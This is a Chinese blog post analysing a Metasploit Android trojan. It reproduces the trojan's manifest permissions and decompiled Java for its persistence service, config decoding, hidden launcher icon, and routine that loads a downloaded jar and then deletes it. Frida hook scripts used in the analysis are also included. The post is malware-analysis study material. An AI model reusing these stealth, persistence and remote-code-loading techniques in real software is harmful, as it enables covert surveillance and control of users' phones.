
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
        <title>Msf Android马分析 | Moyao の小屋</title>
        <meta name="author" content="Moyao">
        <meta name="description" content="Write down something interesting I met
feel free to mail me if you have something wanted to talk about
mail: &lt;moyaoxue@outlook.com&gt;
">
        <meta name="keywords" content="">
        <link rel="icon" href="/images/head.jpg">
        <script src="https://cdn.staticfile.org/instant.page/5.1.0/instantpage.min.js" type="module"></script>
        <script src="https://cdn.staticfile.org/font-awesome/6.1.1/js/all.min.js"></script>
        
        <link rel="stylesheet" href="/css/fonts.min.css">
        <link rel="stylesheet" href="/css/particlex.css">
        
        <script src="https://cdn.staticfile.org/vue/3.2.33/vue.global.prod.min.js"></script>
    <meta name="generator" content="Hexo 6.2.0"></head>
    <body>
        <div id="loading" style="height:100vh;width:100vw;position:fixed;display:flex;z-index:200;justify-content:space-between;background:#fff;transition:opacity 0.3s ease-out"><div style="position:fixed;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center"><div id="loadcontent" style="width:50vmin;height:50vmin;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px #a3ddfb;text-align:center"><div><h2>LOADING...</h2><p style="word-break:keep-all">加载过慢请开启缓存(浏览器默认开启)</p><div><img alt="loading" src="/loading.gif"></div></div></div></div></div>
        <div id="layout">
            <i data-fa-symbol="calendar-solid" class="fa-solid fa-calendar fa-fw"></i>
            <i data-fa-symbol="bookmark-solid" class="fa-solid fa-bookmark fa-fw"></i>
            <i data-fa-symbol="tags-solid" class="fa-solid fa-tags fa-fw"></i>
            <transition name="into">
                <div v-show="show_page" style="display: -not-none">
                    <div id="menu_show">
                         
<nav id="menu">
    <div class="desktop-menu">
        <a href="/">
            <span class="title">Moyao の小屋</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;home</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;about</span>
        </a>
        
        <a target="_blank" rel="noopener" href="//tags/re/">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;tags</span>
        </a>
        
    </div>
    <div :class="'phone-menu ' + menu_show" id="phone-menu">
        <div class="curtain" @click="menu_show = !menu_show" v-show="menu_show"></div>
        <div :class="'title'" @click="menu_show = !menu_show">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;Moyao の小屋</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="menu_show">
            
            <a href="">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">home</div>
                </div>
            </a>
            
            <a href="">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">about</div>
                </div>
            </a>
            
            <a href="/tags/re/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">tags</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>
                    </div>
                    <div id="main">
                        
<div class="article">
    <div>
        <h1>Msf Android马分析 </h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
            </span>
            2024/3/28
        </span>
        
        
    </div>
    <div class="content" v-pre>
        <h6 id="PREFACE"><a href="#PREFACE" class="headerlink" title="PREFACE:"></a>PREFACE:</h6><span id="more"></span>

<h3 id="一、运行效果以及环境搭建"><a href="#一、运行效果以及环境搭建" class="headerlink" title="一、运行效果以及环境搭建"></a>一、运行效果以及环境搭建</h3><p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423141135014.png" alt="image-20240423141135014"></p>
<p>已知这个马上线安卓13（我的测试机环境）是会被直接拦的，尝试了一下安卓7</p>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423172223131.png" alt="image-20240423172223131"></p>
<p>可以上马，上的时候不会检测权限，但是shell不进去以及文件看不到，推测是权限管理系统拦了但是马没有申请，合理怀疑是安卓6.0以后需要动态申请权限，这里的马存在一定问题</p>
<p>这边上一个android5，不行，报错</p>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423172154053.png" alt="image-20240423172154053"></p>
<p>上一个android6，成功！</p>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423173618493.png" alt="image-20240423173618493"></p>
<p>简单看一下我们的权限：</p>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423183527824.png" alt="image-20240423183527824"></p>
<p>​		简单来说没什么用，大概研究一下应该是进应用沙箱了，但是权限是给满的，很奇怪，还是啥也干不了</p>
<h3 id="二、逆向分析"><a href="#二、逆向分析" class="headerlink" title="二、逆向分析"></a>二、逆向分析</h3><h5 id="AndroidMainfest-xml"><a href="#AndroidMainfest-xml" class="headerlink" title="AndroidMainfest.xml"></a>AndroidMainfest.xml</h5><pre><code class="xml">    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.CHANGE_WIFI_STATE&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.ACCESS_COARSE_LOCATION&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.ACCESS_FINE_LOCATION&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.SEND_SMS&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_SMS&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.RECORD_AUDIO&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.CALL_PHONE&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.READ_CONTACTS&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.WRITE_CONTACTS&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.WRITE_SETTINGS&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.CAMERA&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.READ_SMS&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.SET_WALLPAPER&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.READ_CALL_LOG&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.WRITE_CALL_LOG&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.WAKE_LOCK&quot;/&gt;
    &lt;uses-permission android:name=&quot;android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS&quot;/&gt;
    &lt;uses-feature android:name=&quot;android.hardware.camera&quot;/&gt;
    &lt;uses-feature android:name=&quot;android.hardware.camera.autofocus&quot;/&gt;
    &lt;uses-feature android:name=&quot;android.hardware.microphone&quot;/&gt;
</code></pre>
<p>申请权限，注定这个马只能低版本使用</p>
<pre><code class="xml">&lt;application android:label=&quot;@string/app_name&quot;&gt;
    &lt;activity android:label=&quot;@string/app_name&quot; android:name=&quot;.MainActivity&quot; android:theme=&quot;@android:style/Theme.NoDisplay&quot;&gt;
        &lt;intent-filter&gt;
            &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;
            &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;
        &lt;/intent-filter&gt;
        &lt;intent-filter&gt;
            &lt;data android:host=&quot;my_host&quot; android:scheme=&quot;metasploit&quot;/&gt;
            &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt;
            &lt;category android:name=&quot;android.intent.category.BROWSABLE&quot;/&gt;
            &lt;action android:name=&quot;android.intent.action.VIEW&quot;/&gt;
        &lt;/intent-filter&gt;
    &lt;/activity&gt;
    &lt;receiver android:label=&quot;MainBroadcastReceiver&quot; android:name=&quot;.MainBroadcastReceiver&quot;&gt;
        &lt;intent-filter&gt;
            &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot;/&gt;
        &lt;/intent-filter&gt;
    &lt;/receiver&gt;
    &lt;service android:exported=&quot;true&quot; android:name=&quot;.MainService&quot;/&gt;
&lt;/application&gt;
</code></pre>
<p>活动类名：<code>MainActivity</code></p>
<p>注册intent：</p>
<ul>
<li><code>&lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;</code> - 指定该活动为应用程序的主要入口点。</li>
<li><code>&lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;</code> - 指定该活动为启动器活动，即显示在设备的应用程序列表中并且可由用户启动</li>
<li>指定了<code>metasploit</code>协议链接的主机和方案</li>
<li>等等</li>
</ul>
<h5 id="MainService"><a href="#MainService" class="headerlink" title="MainService"></a>MainService</h5><pre><code class="java">public static void start() &#123;
    Class v0_2;
    try &#123;
        v0_2 = Class.forName(&quot;android.app.ActivityThread&quot;);
        goto label_5;
    &#125;
    catch(ClassNotFoundException v0_1) &#123;
        return;
        try &#123;
        label_5:
            Method v1 = v0_2.getMethod(&quot;currentApplication&quot;);
            Context v0_3 = (Context)v1.invoke(null, null);
            if(v0_3 == null) &#123;
                new Handler(Looper.getMainLooper()).post(new c(v1));
                return;
            &#125;
            MainService.startService(v0_3);
        &#125;
        catch(Exception v0) &#123;
        &#125;
        return;
    &#125;
    catch(Exception v0) &#123;
        return;
    &#125;
&#125;
</code></pre>
<ul>
<li>尝试通过反射加载<code>android.app.ActivityThread</code>中的<code>currentApplication</code>方法并通过<code>invoke</code>执行，转化为context类型保存，如果获取不到Context，则通过主线程的 <code>Handler</code> 将一个新的 <code>Runnable</code> 对象发送到消息队列中，以便在主线程中执行，c中的逻辑为在运行时尝试通过之前传递进来的 <code>Method</code> 对象获取 <code>Context</code> 对象，并在获取成功时启动 <code>MainService</code> 服务</li>
</ul>
<pre><code class="java">final class c implements Runnable &#123;
    private Method a;

    c(Method arg1) &#123;
        this.a = arg1;
        super();
    &#125;

    @Override
    public final void run() &#123;
        try &#123;
            Context v0_1 = (Context)this.a.invoke(null, null);
            if(v0_1 != null) &#123;
                MainService.startService(v0_1);
                return;
            &#125;
        &#125;
        catch(Exception v0) &#123;
            return;
        &#125;
    &#125;
&#125;
</code></pre>
<blockquote>
<p>java 反射：<a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/812647">深入理解Java中的反射机制及使用原理！详细解析invoke方法的执行和使用-阿里云开发者社区 (aliyun.com)</a></p>
<ul>
<li>允许运行中的Java程序获取自身信息,并可以操作类或者对象的内部属性</li>
<li>程序中的对象一般都是在编译时就确定下来,Java反射机制可以动态地创建对象并且调用相关属性,这些对象的类型在编译时是未知的</li>
<li>也就是说 ，可以通过反射机制<strong>直接创建对象,即使这个对象类型在编译时是未知的</strong></li>
</ul>
<p>类的加载机制：<strong>JVM</strong>使用<strong>ClassLoader</strong>将字节码文件,即 <strong>class</strong>文件加载到方法区内存中</p>
<pre><code class="java">Class clazz = ClassLoader.getSystemClassLoader().loadClass(&quot;com.mypackage.MyClass&quot;);
</code></pre>
<p><strong>ClassLoader</strong>类根据类的完全限定名加载类并返回一个<strong>Class</strong>对象</p>
<p>反射的用途：</p>
<ul>
<li>很多框架都是配置化的,通过<strong>XML</strong>文件配置<strong>Bean</strong></li>
<li>为了保证框架的通用性,需要根据配置文件加载不同的对象或者类,调用不同的方法</li>
<li>要运用反射,运行时动态加载需要加载的对象</li>
</ul>
<p><strong>这里主要就是用③，实现动态加载，反射是各种容器实现的核心</strong></p>
<p>从类中获取一个方法后,可以使用<strong>invoke()</strong> 来调用这个方法</p>
</blockquote>
<pre><code class="java">public int onStartCommand(Intent arg2, int arg3, int arg4) &#123;
    Payload.start(this);
    return 1;
&#125;
</code></pre>
<p><code>Service</code> 类的重写方法，用于处理启动服务的命令。<code>1</code> 表示如果服务被杀死了，系统尝试重新创建服务并调用 <code>onStartCommand()</code> 方法；即这里会维持在后台循环启动payload</p>
<p>我们知道，frida会悬挂进程并多起四个线程（可以自行调试，这个地方还没有具体了解原理，不过需要注意）那么我们编辑运行基本的一个脚本就会观察到有</p>
<pre><code class="javascript">setImmediate(function()&#123;
    console.log(&quot;lld [*]&quot;);
    Java.perform(function()&#123;
        var myClass = Java.use(&quot;com.metasploit.stage.MainActivity&quot;);
        myClass.implementation = function(v)&#123;
        &#125;
    &#125;)
&#125;)
</code></pre>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424133646117.png" alt="image-20240424133646117"></p>
<p>后台重新加载了几次payload，使得vps重新接收到了sessions，随即关闭掉前面的链接，可以认为我们的推断是基本正确的，这部分实现了马的持久化</p>
<p>测试payload的重加载：</p>
<pre><code class="javascript">setImmediate(function()&#123;
    console.log(&quot;lld [*]&quot;);
    Java.perform(function()&#123;
        var myClass = Java.use(&quot;com.metasploit.stage.MainService&quot;);
        myClass.onStartCommand.implementation = function(arg2, arg3, arg4)&#123;
            send(&#39;com.myclass.onStartCommand.implementation&#39;);
            var ret = this.onStartCommand(arg2, arg3, arg4);
            send(&quot;result:&quot;+2);
            return 2;
        &#125;
    &#125;)
&#125;)
</code></pre>
<img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424142410325.png" alt="image-20240424142410325" style="zoom:33%;">

<p>修改返回值，服务会快速重置，但是新的连接无法维持，原因是我们hook了返回值为<code>START_NOT_STICKY</code></p>
<h5 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h5><h6 id="class-b"><a href="#class-b" class="headerlink" title="class b"></a>class b</h6><pre><code class="java">private static int a(byte[] arg4, int arg5) &#123;
    int v0 = 0;
    int v1 = 0;
    while(v0 &lt; 4) &#123;
        v1 |= (arg4[v0 + arg5] &amp; 0xFF) &lt;&lt; (v0 &lt;&lt; 3);
        ++v0;
    &#125;

    return v1;
&#125;
</code></pre>
<p>这里明显是一个大小端序转化，基本上就是在对payload做数据处理，先大体手动还原符号，看起来就是简单编码还原payload内容并获取信息：</p>
<pre><code class="java">package com.metasploit.stage;

import java.io.UnsupportedEncodingException;
import java.util.concurrent.TimeUnit;

public final class b &#123;
    private static final long timestamp;

    static &#123;
        b.timestamp = TimeUnit.SECONDS.toMillis(1L);
    &#125;

    private static int change_endian(byte[] arg4, int arg5) &#123;
        int v0 = 0;
        int v1 = 0;
        while(v0 &lt; 4) &#123;
            v1 |= (arg4[v0 + arg5] &amp; 0xFF) &lt;&lt; (v0 &lt;&lt; 3);
            ++v0;
        &#125;

        return v1;
    &#125;

    public static a a(byte[] arg11) &#123;
        a v3 = new a();
        v3.a = b.change_endian(arg11, 0);
        long v6 = (long)b.change_endian(arg11, 12);
        v3.b = b.timestamp * v6;
        b.copy_array(arg11, 16, 16);
        b.copy_array(arg11, 0x20, 16);
        int v0 = 0x30;
        if((v3.a &amp; 1) != 0) &#123;
            v3.c = b.encode(arg11, 8000, 100);
        &#125;

        while(arg11[v0] != 0) &#123;
            g v4 = new g();
            v4.a = b.encode(arg11, v0, 0x200);
            int v0_1 = v0 + 0x204;
            long v8 = (long)b.change_endian(arg11, v0_1);
            v4.b = b.timestamp * v8;
            int v0_2 = v0_1 + 4;
            long v8_1 = (long)b.change_endian(arg11, v0_2);
            v4.c = b.timestamp * v8_1;
            v0 = v0_2 + 4;
            if(v4.a.startsWith(&quot;http&quot;)) &#123;
                b.encode(arg11, v0, 0x80);
                int v0_3 = v0 + 0x80;
                b.encode(arg11, v0_3, 0x40);
                int v0_4 = v0_3 + 0x40;
                b.encode(arg11, v0_4, 0x40);
                int v0_5 = v0_4 + 0x40;
                v4.d = b.encode(arg11, v0_5, 0x100);
                int v0_6 = v0_5 + 0x100;
                v4.e = null;
                byte[] v5 = b.copy_array(arg11, v0_6, 20);
                int v2 = v0_6 + 20;
                int v0_7;
                for(v0_7 = 0; v0_7 &lt; v5.length; ++v0_7) &#123;
                    if(v5[v0_7] != 0) &#123;
                        v4.e = v5;
                        break;
                    &#125;
                &#125;

                StringBuilder v5_1 = new StringBuilder();
                int v0_8;
                for(v0_8 = v2; v0_8 &lt; arg11.length; ++v0_8) &#123;
                    byte v7 = arg11[v0_8];
                    if(v7 == 0) &#123;
                        break;
                    &#125;

                    v5_1.append(((char)(v7 &amp; 0xFF)));
                &#125;

                String v0_9 = v5_1.toString();
                v4.f = v0_9;
                v0 = v0_9.length() + v2;
            &#125;

            v3.d.add(v4);
        &#125;

        return v3;
    &#125;

    private static String encode(byte[] arg3, int arg4, int arg5) &#123;
        byte[] v0 = b.copy_array(arg3, arg4, arg5);
        try &#123;
            return new String(v0, &quot;ISO-8859-1&quot;).trim();
        &#125;
        catch(UnsupportedEncodingException v1) &#123;
            return new String(v0).trim();
        &#125;
    &#125;

    private static byte[] copy_array(byte[] arg2, int arg3, int arg4) &#123;
        byte[] v0 = new byte[arg4];
        System.arraycopy(arg2, arg3, v0, 0, arg4);
        return v0;
    &#125;
&#125;
</code></pre>
<p>这里重载函数比较多，可以直接拿脚本批量打印一下看，</p>
<pre><code class="javascript">function logInf(classs)&#123;
    Java.perform(function ()&#123;
        var Modifier = Java.use(&quot;com.metasploit.stage.b&quot;);
        var modifiers = classs.getModifiers();
        classs.setAccessible(true);
        if (Modifier.isStatic(modifiers)) &#123;
            // 静态字段
            var value = classs.get(null);
            console.log(classs + &quot; =&gt;&quot;  + value)
        &#125; else &#123;
             console.log(classs)
        &#125;
    &#125;)
&#125;
function getAllsonClass(classs)&#123;
    console.log(&#39;\n&#39;)
    console.log(&quot;查询到子类  =&gt;&quot; + classs.getName())
    hookClass(String(classs.getName()))
&#125;
var thisclass = null;
//&quot;java.security.MessageDigest&quot;
function hookClass(CLASS)&#123;
Java.perform(function()&#123;
    var classStudent = Java.use(CLASS);
    var classs = classStudent.class;
 
    //获取所有内部类
    var innerClasses = classs.getDeclaredClasses();
    if(innerClasses.length &gt; 0)&#123;
        innerClasses.forEach(getAllsonClass);
    &#125;
    console.log(&quot;===========&quot; + classs + &quot;中的所有变量==============&quot;)
    //输出所有变量
    classs.getDeclaredFields().forEach(logInf)
    console.log(&quot;===========&quot; + classs +  &quot;的所有方法==============&quot;)
    //输出所有方法,并hook
    classs.getDeclaredMethods().forEach(function(method)&#123;
        console.log(method)
       var methodsName = method.getName();
       var overloads  = classStudent[methodsName].overloads;
    //    console.log(overloads.length)
       for (var i=0; i&lt; overloads.length; i++)&#123;
            overloads[i].implementation = function () &#123;
            console.log(&#39;\n&#39;)
            console.warn(&quot;进入&quot; + classs.getName() + &quot;类的&quot; + methodsName + &quot;方法&quot;)
            for(var j=0; j&lt;arguments.length; j++)&#123;
                console.error(&quot;参数&quot; + j + &quot; =&gt; &quot; + arguments[j])
            &#125;
            if (arguments.length === 0) &#123;
              console.log(&quot;该函数无参数&quot;);
            &#125;
            var result = this[methodsName].apply(this,arguments)
            console.error(&quot;结果是 =&gt; &quot; + result)
            return result;
            &#125;;
        &#125;
    &#125;)
    console.log(&#39;\n&#39;)
&#125;)
&#125;
function main()&#123;
    try &#123;
        hookClass(&quot;com.metasploit.stage.b&quot;)
    &#125;catch (e) &#123;
        console.log(&quot;没有找到该类&quot;)
    &#125;
&#125;
 
setImmediate(main)
</code></pre>
<p>可以看到两个比较关键的结果：</p>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424154214031.png" alt="image-20240424154214031"></p>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424154229414.png" alt="image-20240424154229414"></p>
<p>即，这里的payload就是msf马生成的信息部分，在b函数中还原出信息并添加生成一个http request包</p>
<h6 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h6><pre><code class="java">if((v6.a &amp; 4) != 0 &amp;&amp; Payload.b != null) &#123;
    PowerManager.WakeLock v0 = ((PowerManager)Payload.b.getSystemService(&quot;power&quot;)).newWakeLock(1, Payload.class.getSimpleName());
    v0.acquire();
    v1 = v0;
&#125;
</code></pre>
<ul>
<li>这里创建了一个 <code>WakeLock</code> 对象 <code>v0</code>，它允许应用程序保持设备唤醒状态，这里通过 <code>Payload.b.getSystemService(&quot;power&quot;)</code> 获取了系统服务 <code>power</code>，并将其转换为 <code>PowerManager</code> 对象。然后调用 <code>newWakeLock(1, Payload.class.getSimpleName())</code> 方法创建了一个 <code>WakeLock</code> 对象，参数 <code>1</code> 表示创建的 <code>WakeLock</code> 类型是 <code>PARTIAL_WAKE_LOCK</code>，即部分唤醒锁定，它允许CPU继续运行，但允许屏幕和其他系统资源关闭。</li>
</ul>
<pre><code class="java">private static void a() &#123;
    if(Payload.b != null) &#123;
        String v1 = Payload.b.getPackageName();
        PackageManager v2 = Payload.b.getPackageManager();
        Intent v0 = new Intent(&quot;android.intent.action.MAIN&quot;, null);
        v0.addCategory(&quot;android.intent.category.LAUNCHER&quot;);
        for(Object v0_1: v2.queryIntentActivities(v0, 0)) &#123;
            ResolveInfo v0_2 = (ResolveInfo)v0_1;
            if(!v1.equals(v0_2.activityInfo.packageName)) &#123;
                continue;
            &#125;
            v2.setComponentEnabledSetting(new ComponentName(v1, v0_2.activityInfo.name), 2, 1);
        &#125;
    &#125;
&#125;
</code></pre>
<ul>
<li>实现了禁用启动器图标，与上文callback可以隐匿在后台刷新</li>
</ul>
<p>下面一段是进行基础的tcp解包，不需要讲，后面可以直接抓包看行为</p>
<pre><code class="java">private static void a(DataInputStream arg11, OutputStream arg12, Object[] arg13) &#123;
    if(Payload.e == null) &#123;
        String v0 = (String)arg13[0];
        String v1 = v0 + File.separatorChar + Integer.toString(new Random().nextInt(0x7FFFFFFF), 36);
        String v2 = v1 + &quot;.jar&quot;;
        String v3 = new String(Payload.a(arg11));
        byte[] v4 = Payload.a(arg11);
        File v5 = new File(v2);
        if(!v5.exists()) &#123;
            v5.createNewFile();
        &#125;

        FileOutputStream v6 = new FileOutputStream(v5);
        v6.write(v4);
        v6.flush();
        v6.close();
        Class v0_1 = new DexClassLoader(v2, v0, v0, Payload.class.getClassLoader()).loadClass(v3);
        Object v2_1 = v0_1.newInstance();
        v5.delete();
        new File(v1 + &quot;.dex&quot;).delete();
        v0_1.getMethod(&quot;start&quot;, DataInputStream.class, OutputStream.class, Object[].class).invoke(v2_1, arg11, arg12, arg13);
    &#125;
    else &#123;
        Payload.class.getClassLoader().loadClass(Payload.e).getConstructor(DataInputStream.class, OutputStream.class, Object[].class, Boolean.TYPE).newInstance(arg11, arg12, arg13, Boolean.valueOf(false));
    &#125;

    Payload.c = -1L;
&#125;
</code></pre>
<p>这里很明显动态生成了文件，并反射运行其中的部分内容，相同的方法抓取方法返回值和参数，可以拿到：</p>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424161446827.png" alt="image-20240424161446827"></p>
<p>反射运行了这个方法，这里仍旧是一个loader</p>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424160834420.png" alt="image-20240424160834420"></p>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424160846551.png" alt="image-20240424160846551"></p>
<p>那么这里就需要获得里面的<code>met.jar</code>，有点缺乏经验不知道怎么搞（这里需要清楚，frida去hook的是app内所有的内容，即使loader加载的也不例外），不过询问了一下可以去hook <code>File.delete</code>，然后去找文件</p>
<pre><code class="javascript">setImmediate(function()&#123;
    console.log(&quot;lld [*]&quot;);
    Java.perform(function()&#123;
        var myClass = Java.use(&quot;java.io.File&quot;);
        myClass.delete.implementation = function()&#123;
            // var ret = this.onStartCommand();
            console.log(&quot;delete hooked&quot;);
        &#125;
    &#125;)
&#125;)
</code></pre>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424190256641.png" alt="image-20240424190256641"></p>
<p>这frida确实有点好用的</p>
<h5 id="met-jar"><a href="#met-jar" class="headerlink" title="met.jar"></a>met.jar</h5><p>根据刚才的分析，入口类就是这里的<code>com.metasploit.meterpreter.AndroidMeterpreter</code></p>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424191136119.png" alt="image-20240424191136119"></p>
<p>里面的马已经相当明文，就暂时不看了</p>

    </div>
    
</div>
                         
<footer id="footer">
    <div class="footer-wrap">
        <div>
            © 20xx - 2024 Moyao の小屋
            <span class="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            @Moyao
        </div>
        <div></div>
        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
                target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a></div>
        
    </div>
</footer>
                    </div>
                </div>
            </transition>
            <div id="img_show">
                <img id="img_content" alt="img_show">
            </div>
        </div>
        <script src="https://cdn.staticfile.org/highlight.js/11.5.1/highlight.min.js"></script>
        <script src="/js/particlex.js"></script>
        <script src="/js/showimg.js"></script>
        

    </body>
</html>